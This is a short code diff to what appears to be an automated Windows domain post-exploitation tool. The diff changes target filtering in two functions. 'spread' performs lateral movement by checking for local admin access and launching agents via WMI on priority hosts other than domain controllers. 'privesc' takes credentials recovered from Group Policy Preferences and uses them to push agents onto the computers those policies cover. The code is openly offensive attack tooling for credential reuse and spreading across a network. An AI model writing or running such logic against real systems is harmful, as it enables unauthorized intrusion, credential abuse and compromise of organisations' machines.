@@ -494,7 +494,7 @@ def spread(agent_name):
 
             print_info('Starting lateral movement', agent_name)
             if priority_targets:
-                for box in set(priority_targets) ^ set(domain_controllers):
+                for box in [target for target in priority_targets if target not in domain_controllers]:
                     if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
                         invoke_wmi(agent_name, box)
 
@@ -511,7 +511,7 @@ def privesc(agent_name):
         for result in gpp(agent_name):
             computers = get_gpo_computer(agent_name, result['guid'])
             for username, password in result['creds'].items():
-                for box in set(priority_targets) & set(computers):
+                for box in [target for target in priority_targets if target in computers]:
                     if not agent_on_host(hostname=box):
                         # These are local accounts so we append '.\' to the username to specify it
                         invoke_wmi(agent_name, box, username='.\\' + username, password=password)
